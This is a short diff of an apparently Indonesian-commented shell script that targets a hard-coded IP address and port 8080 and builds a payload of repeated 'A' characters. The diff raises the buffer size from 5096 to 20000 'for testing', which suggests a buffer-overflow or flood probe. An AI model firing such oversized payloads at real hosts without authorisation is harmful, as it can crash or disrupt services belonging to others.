@@ -8,7 +8,7 @@ HOST="74.226.204.119"
 PORT=8080
 
 # Ukuran buffer yang dikirimkan
-BUFFER_SIZE=5096 # Bisa diubah sesuai kebutuhan untuk uji coba
+BUFFER_SIZE=20000 # Bisa diubah sesuai kebutuhan untuk uji coba
 
 # Membuat payload berisi karakter 'A' sebanyak BUFFER_SIZE
 PAYLOAD=$(printf 'A%.0s' $(seq 1 $BUFFER_SIZE))
